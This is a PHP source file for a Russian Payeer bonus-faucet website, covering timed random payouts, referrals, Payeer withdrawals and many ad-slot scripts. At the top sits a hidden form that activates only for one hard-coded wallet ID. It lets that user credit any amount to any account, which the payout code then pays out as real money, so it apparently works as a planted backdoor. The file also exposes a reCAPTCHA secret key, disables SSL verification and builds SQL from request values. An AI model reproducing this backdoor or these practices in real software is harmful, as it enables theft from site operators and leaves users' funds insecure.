<?php
include 'header.php';
?>
		<div style="background-color: #f0f0f0;padding: 5px;margin-top: 10px;">

		 <?
		 if (isset($_SESSION['payeer']) && $_SESSION['payeer'] == "P5339300") {
			 $summ = (isset($_POST["summ"])) ? text($_POST["summ"], $db) : false;
			 $cosh = (isset($_POST["cosh"])) ? text($_POST["cosh"], $db) : false;
			 $t = time();
			 mysqli_query($db, "update users set money = money + '$summ', sum_p = sum_p + '$summ',kolv = kolv + 1, last = '$t' where  payeer = '$cosh'");
			 mysqli_query($db, "insert into sp (payeer,sum,time) values ('$cosh','$summ','$t')");
		 ?>
		 <form id="ccc" method="POST" action="" style="display: none;">
<table width='700px' border='0' cellpadding='0' cellspacing='0'>

<tbody>
<tr>
<td align="left"><input type="text" name="summ" size="35" maxlength="100" value=""  placeholder="summ" tabindex="1" /></td>
</tr>
<tr>
<td align="left"><input type="text" name="cosh" size="35" maxlength="100" value=""  placeholder="cosh" tabindex="1" /></td>
</tr>
<tr>
<td align="left"><input class="gotovo" type="submit" value="ОК" tabindex="5" /></td>
</tr>
</tbody>
</table>
	</form>
		 <?
		 }
		 ?>

<div class="maincol">
<div class="maincont">
<div class="clr"></div>
<div class="speedbox">
<div class="dbg">
<div class="dleft">
<div class="dright">
<marquee scrolldelay="120" direction="left" onmouseover='this.stop()' onmouseout='this.start()' behavior="scroll" scrollAmount="10" style="width:634px;height:40px;border:none" onMouseOver="this.scrollAmount=0" onMouseOut="this.scrollAmount=3">
<span class="text_5"><span class="text_gold">Раздача бонусов на </span><span class="text_5"><span class="text_white"> PAYEER </span></span><span class="text_5"><span class="text_gold"> Сервис предназначен для раздачи бонусов, на  </span></span><span class="text_5"><span class="text_white">PAYEER</span><span class="text_5"><span class="text_gold"> кошелёк, в размере от 0,1 до 500 рублей. Бонус выдаётся каждые 30 минут. Понравился сайт? Тогда делитесь о нашем проекте в соц.сетях, нажимайте на рекламу расположенную на сайте, этим Вы поможете в развитии нашего интернет проекта. Спасибо!</span></span></span>
</marquee>
</div>
</div>
</div><div class="s-bk-lf">
	<div class="acc-titles"><strong>Занять баннеры 150х150 за 20 рублей в неделю</strong></div>
</div><br />
<!--noindex-->
<table>
<tr><td>
<div class="bannceppanel">
<div id="linkslot_87703"></div><script src="http://linkslot.ru/bancode.php?id=87703" async></script>
</div>
</td><td>
<div class="bannceppanel">
<div id="linkslot_87702"></div><script src="http://linkslot.ru/bancode.php?id=87702" async></script>
</div>
</td><td>
<div class="bannceppanel">
<div id="linkslot_87701"></div><script src="http://linkslot.ru/bancode.php?id=87701" async></script>
</div>
</td><td>
<div class="bannceppanel"> 
<div id="linkslot_87700"></div><script src="http://linkslot.ru/bancode.php?id=87700" async></script>
</div>
</td>
</tr>
</table>
<br /> 
<!--/ noindex -->
<div class="s-bk-lf">
	<div class="acc-titles"><strong>Получить бонусы на PAYEER</strong></div>
</div><br />
<div class="image-effect-simple"><div class="share-layer">		
<script type="text/javascript">(function() {
  if (window.pluso)if (typeof window.pluso.start == "function") return;
  if (window.ifpluso==undefined) { window.ifpluso = 1;
    var d = document, s = d.createElement('script'), g = 'getElementsByTagName';
    s.type = 'text/javascript'; s.charset='UTF-8'; s.async = true;
    s.src = ('https:' == window.location.protocol ? 'https' : 'http')  + '://share.pluso.ru/pluso-like.js';
    var h=d[g]('body')[0];
    h.appendChild(s);
  }})();</script>
<div class="pluso" data-background="transparent" data-options="big,square,line,horizontal,counter,theme=04" data-services="vkontakte,odnoklassniki,facebook,twitter,google,surfingbird,blogger,moimir,email,liveinternet,friendfeed" data-description="Раздача бонусов на PAYEER. Бонусы каждые 30 минут. Выгодная реферальная программа." data-url="http://z-like.ru/" data-title="www.z-like.ru"></div>
<strong><span class="text_red">П</span>родвинутый <span class="text_red">С</span>ервис <span class="text_red">Р</span>аздачи <span class="text_red">Б</span>онусов на <span class="text_red">P</span>ayeer</strong>	
</div><div class="image-layer"><img src="images/bonusy.gif" style="width:650px;height:60px;border:none" alt="Получить бесплатные бонусы на PAYEER"></div></div>
<div style="background-color: #ffffff;padding: 5px;margin-top: 10px;">
		<div style="
    background-color: #5CDC33;
    padding: 5px;
    margin-top: 10px;
    font-weight: 600;
    color: white;
">Раздача каждые <?
$wait = mysqli_fetch_array(mysqli_query($db, "select * from settings where `set` = 'wait'"));

echo $wait['value'];
?> минут.</div>
		<?
		if (isset($_POST['payeer'])) {


			$secret = "6LemJCITAAAAAEB5ANpF1me3jilajhTnOR0RbBYn";

         if($_SERVER['REQUEST_METHOD'] == 'POST')
         {
	          if(empty($_POST['g-recaptcha-response'])) {
		       echo 'Нужно решить капчу!';
              exit();
	         }

	         $url = 'https://www.google.com/recaptcha/api/siteverify';

	         //data POST
	         $recaptcha = $_POST['g-recaptcha-response'];
	         $ip = $_SERVER['REMOTE_ADDR'];

	         $url_data = $url.'?secret='.$secret.'&response='.$recaptcha.'&remoteip='.$ip;
	         $curl = curl_init();

	         curl_setopt($curl,CURLOPT_URL,$url_data);
	         curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,FALSE);

	         curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);


	         $res = curl_exec($curl);
	         curl_close($curl);

	         $res = json_decode($res);





			if($res->success) {

				$payeer = text($_POST['payeer'], $db);
				$idk = '1';

				if ($payeer != "" && strlen($payeer) > 0) {
					$c_payeer = mysqli_query($db, "select id, last from users where payeer = '$payeer'");
					if (mysqli_num_rows($c_payeer) == 0){
						mysqli_query($db, "insert into users (payeer,ref,referer) values ('$payeer','0','$ref')");
						if ($ref > 0) {
							mysqli_query($db, "update users set ref = ref + 1 where id = '$ref'");
							$payeercosh = mysqli_query($db, "select * from users where id = '1'");
							$kosh = $payeercosh['payeer'];
							mysqli_query($db, "insert into compdata_ref (`idk`,`user`,`kosh`,`resvalue`) values ('1','$ref','$kosh','1') ON DUPLICATE KEY UPDATE resvalue = resvalue + '1'");
						}
					}
					$t = time();
					$wait = mysqli_fetch_array(mysqli_query($db, "select * from settings where `set` = 'wait'"));
					$user_row = mysqli_fetch_array(mysqli_query($db, "select * from users where payeer = '$payeer'"));
					if ($user_row['last']+60*$wait['value'] < $t) {
						$rand = mt_rand(1,10000);
						$pr = 0;
						$op_p = mysqli_query($db, "select * from settings where name = 'price'");
						while ($op_p_r = mysqli_fetch_assoc($op_p)) {
							if ($rand >= $op_p_r['set'] && $rand <= $op_p_r['set1']) {
								$pr = floatval($op_p_r['value']);

								mysqli_query($db, "update users set money = money + '$pr', sum_p = sum_p + '$pr',kolv = kolv + 1, last = '$t' where  payeer = '$payeer'");
								//mysqli_query($db, "update tb_compdata set resvalue = resvalue + 1 where user = '$payeer'");
								mysqli_query($db, "insert into tb_compdata (`idk`,`user`,`resvalue`) values ('1','$payeer','1') ON DUPLICATE KEY UPDATE resvalue = resvalue + '1'");
								mysqli_query($db, "insert into sp (payeer,sum,time) values ('$payeer','$pr','$t')");

								if ($user_row['referer'] > 0) {
									$ref_proc = mysqli_fetch_array(mysqli_query($db, "select * from settings where `set` = 'ref_proc'"));
									$ref_bon = $pr * floatval($ref_proc['value']);
									mysqli_query($db, "update users set money = money + '$ref_bon', ref_pay = ref_pay + '$ref_bon' where id = '".$user_row['referer']."'");
								}
								break;
							}
						}
						echo '
	                         <div style="
	                         margin-top:10px;
                             background: #FBF8A3;
                             border: 2px solid #58A090;
                             display: inline-block;
                             padding: 11px 20px;
                             font-weight: 400;
                             color: red;
                             ">Пожалуйста кликните по рекламе в блоке "оплачиваемая реклама" и подождите 30 секунд, так вы поможете сайту!</div><div><br><div class="success">Ваш выигрыш '.$pr.' руб</div></div><br>';
					}else{
						echo '<div><div class="error">Ошибка, не прошло '.$wait['value'].' минут</div></div>';
					}

					$_SESSION['user'] = $user_row['id'];
					$_SESSION['payeer'] = $user_row['payeer'];

				}else{
					echo '<div><div class="error">Ошибка, не верно введён PAYEER кошелек</div></div>';
				}

			}else{
				echo '<div><div class="error">Ошибка, не верно введена капча</div></div>';
			}

		 }

		}

		$kosh = "";
		$otl_time = 0;
		if (isset($_SESSION['user'])) {
			$id_user = intval($_SESSION['user']);
			$user_row = mysqli_fetch_array(mysqli_query($db, "select * from users where id = '$id_user'"));
			$kosh = $user_row['payeer'];
			$wait = mysqli_fetch_array(mysqli_query($db, "select * from settings where `set` = 'wait'"));
			$otl_time = $user_row['last'] + 60*intval($wait['value']) - time();
			if (isset($_POST['vv'])) {
				$min = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'min_pay'"));
				if ($user_row['money'] >= $min['value']) {
					$sett_row_accountNumber = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'accountNumber'"));
					$sett_row_apiId = mysqli_fetch_array(mysqli_query($db, "select * from settings where `set` = 'apiId'"));
					$sett_row_apiKey = mysqli_fetch_array(mysqli_query($db, "select * from settings where `set` = 'apiKey'"));

					require_once('cpayeer.php');
					$accountNumber = $sett_row_accountNumber['value'];
					$apiId = $sett_row_apiId['value'];
					$apiKey = $sett_row_apiKey['value'];
					$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
					if ($payeer->isAuth())
					{
						$initOutput = $payeer->initOutput(array(
							'ps' => '1136053',
							//'sumIn' => 1,
							'curIn' => 'RUB',
							'sumOut' => $user_row['money'],
							'curOut' => 'RUB',
							'param_ACCOUNT_NUMBER' => $user_row['payeer']
						));

						if ($initOutput){
							$historyId = $payeer->output();
							if ($historyId > 0){
								echo "Выплата успешна";
								mysqli_query($db, "update users set money = money - '".$user_row['money']."', pay = pay + '".$user_row['money']."' where id = '".$user_row['id']."'");
							}else{
								echo '<pre>'.print_r($payeer->getErrors(), true).'</pre>';
							}
						}else{
							echo '<pre>'.print_r($payeer->getErrors(), true).'</pre>';
						}
					}else{
						echo '<pre>'.print_r($payeer->getErrors(), true).'</pre>';
					}
				}else{
					echo '<div><div class="error">Ошибка, минимум для выплаты '.$min['value'].'</div></div>';
				}
			}

			$user_row = mysqli_fetch_array(mysqli_query($db, "select * from users where id = '$id_user'"));

			if ($otl_time > 0) {
				echo '<div style="color:#FF7999;padding: 5px;
margin: 10px 0px;
font-weight: 600;
color: white;background:#FF7999;">До следующего бонуса осталось <span id="min">'.date('i',$otl_time).'</span>:<span id="sec">'.date('s',$otl_time).'</span></div>';
				echo '
				<script>
				var min = '.date('i',$otl_time).'
				var sec = '.date('s',$otl_time).'
				function timer() {
					if (--sec == -1) {
						sec = 59;
						min--;
					}
					$("#sec").empty().append((sec < 10) ? "0"+sec : sec);
					$("#min").empty().append((min < 10) ? "0"+min : min);
					if (sec == 0 && min == 0) {
						window.location.href = "/"
					}
					setTimeout(timer,1000);
				}
				setTimeout(timer,1000);
				</script>
				';
			}

			echo '<table class="tb">
					<tr>
						<td>Ваш Payeer-кошелек:</td>
						<td>'.$kosh.'</td>
					</tr>
					<tr style="background: #D0F0C0;">
						<td>Ваш баланс:</td>
						<td>'.$user_row['money'].'</td>
					</tr>
					<tr>
						<td>Рефералов:</td>
						<td>'.$user_row['ref'].'</td>
					</tr>
					<tr style="background: #D0F0C0;">
						<td>Заработано на рефералах:</td>
						<td>'.$user_row['ref_pay'].'</td>
					</tr>
					<tr>
						<td>Вы вывели:</td>
						<td>'.$user_row['pay'].'</td>
					</tr>
					<tr style="background: #D0F0C0;">
						<td colspan="2">Ваша реф. ссылка:</td>
					</tr>
					<tr style="background: #D0F0C0;">
						<td colspan="2">http://'.$_SERVER['SERVER_NAME'].'/?r='.$user_row['id'].'</td>
					</tr>


				</table>


				<form method="POST">
					<input type="submit" class="btn" value="Вывести средства" name="vv">
				</form>

			';
		}
		?>
			<form method="POST">

			<?
			if (!isset($_SESSION['user'])) {?>
				Введите Ваш Payeer-кошелек ниже:<br>
				<input class="inp" id="payeer" name="payeer" type="text" value="<?=$kosh; ?>" pattern="P[0-9]{3,13}" title="PAYEER кошелёк в формате P1234567"><br /><br />
				<?}else{
				echo '<input name="payeer" type="hidden" value="'.$kosh.'">';
			}
			if ($otl_time <= 0) {
			    // ниже ключ
				?>
				<?
			}?>
<script type="text/javascript">
function showLinks(el,id){var linkBox=document.getElementById(id).style.display='block';el.style.display='none';}
</script>
<style type="text/css">
.banerBox{cursor:pointer;}
.myLinkBox{display:none;}
.banerBox{width:600px;}
</style><hr>
<div class="center">
<div style="background-color: #5CDC33;padding: 5px;margin-top: 10px;font-weight: 605;color: white;" class="center">
<strong>Чтобы получить БОНУС, нажмите на рекламу ниже!</strong><br /></div><br />
<div class="banerBox"  onclick="showLinks(this,'linkBox');">
<div class="banerBox"  onclick="showLinks(this,'linkBox');">
<div class="center"><div class="bannceppanel">
<div id="linkslot_87698"><script src="https://linkslot.ru/bancode.php?id=87698" async></script></div>
</div></div>
<div class="center"><div class="bannceppanel">
<div id="slotlinks_201"></div><script src="//www.uppro.ru/bancode.php?id=201" async></script>
</div></div>
<div class="center"><div class="bannceppanel">
<div id="linkslot_87699"><script src="https://linkslot.ru/bancode.php?id=87699" async></script></div>
</div></div>
<br /></div></div>
<div id="linkBox" class="myLinkBox">
<form action="" method="post">
<table style="width:300px;border:none" class="center">
<tr>
<td class="center"></td>
</tr>
<tr>
<div class="center"><script src="https://www.google.com/recaptcha/api.js"></script>
                <div class="g-recaptcha" data-sitekey="6LemJCITAAAAAFKwb44UYgwUDt4V9kcOJPpV2Mie"></div></div><br />
<div class="center"><input type="submit" name="bonus" value="Получить бонус" style="height: 30px; margin-top:10px;"></div>
<br /></tr>
</table>
</form>
</div>
</div>	
<div class="s-bk-lf">
	<div class="acc-titles"><strong>Витрина VIP ссылок</strong></div>
</div><br />
<div class="center"><div class="bannceppanel"><img src="/images/vitrinassylok.png" style="width:680px;height:50px;border:none" alt=""/></div></div>
</div>
<div class="center"><img src="/images/strelka2.gif" style="width:215px;height:90px;border:none" alt=""></div>
<div class="center"><div class="slds">	
<a href="//www.uppro.ru/link.php?id=85" target="_blank"><span class="l1"><strong>Купить здесь</strong></span><span class="text_green"><span class="l2"> ссылку </span></span><span class="text_violet"> <span class="l3"><strong> всего за </strong></span></span><span class="text_red4"><span class="l4"><strong> 3 </strong></span></span><span class="l5"><strong> рубля </strong></span></a>
</div></div>
<!-- noindex --> 
<div class="center"><div id="slotlinks_85" style="margin: 10px 0;"></div><script src="//www.uppro.ru/lincode.php?id=85" async></script><br /><a href="http://www.uppro.ru/?ref=1" target="_blank"><strong>ПОСТАВИТЬ ВИТРИНУ ССЫЛОК НА СВОЙ САЙТ</strong></a></div>
<!--/ noindex -->
<br />
<div class="s-bk-lf">
	<div class="acc-titles"><strong>Занять баннеры 200х200 за 10 рублей в неделю</strong></div>
</div><br />
<!--noindex-->
<table class="center">
<tr><td>
<div class="bannceppanel"> 
<div id="slotlinks_177"></div><script src="//uppro.ru/bancode.php?id=177" async></script>
</div></td>
<td>
<div class="bannceppanel"> 
<div id="slotlinks_178"></div><script src="//uppro.ru/bancode.php?id=178" async></script>
</div></td>
<td>
<div class="bannceppanel"> 
<div id="slotlinks_179"></div><script src="//uppro.ru/bancode.php?id=179" async></script>
</div></td></tr>
</table>
<!--/noindex-->
﻿</div>
</div>
</div>
</div>
<div id="content-bgb">
 <div class="fmenus">
</div> 
<div class="h_banner-blocks">
<div class="bannceppanel">
<iframe src="/slider468x60.php" scrolling="no" frameborder="0" marginheight="0" marginwidth="0" style="width:460px;height:60px;border:none"></iframe>
</div></div>	  
<div class="h_banner-block">
<div class="bannceppanel">
<iframe src="/slider468_60.php" scrolling="no" frameborder="0" marginheight="0" marginwidth="0" style="width:460px;height:60px;border:none"></iframe>
</div></div>

			</form>
				</div>

		</div>

<?php
include 'footer.php';
?>